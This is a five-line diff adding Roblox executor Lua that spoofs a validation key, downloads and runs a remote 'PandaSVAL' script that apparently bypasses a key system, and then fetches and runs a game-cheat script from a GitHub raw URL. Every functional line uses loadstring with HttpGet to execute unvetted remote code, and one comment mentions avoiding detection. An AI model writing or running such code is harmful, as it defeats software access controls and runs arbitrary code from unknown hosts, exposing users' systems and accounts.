@@ -1,0 +1,5 @@
+getgenv().UseKey="25ms" -- key that will validate, defaults to 25ms
+getgenv().AllowAnyKey=false -- will allow any key, not recommended, easy to detect
+loadstring(game:HttpGet("http://you.whimper.xyz/PandaSVAL.lua"))()
+-- put the script you want to bypass here
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BlizTBr/scripts/refs/heads/main/FTAP.lua"))()
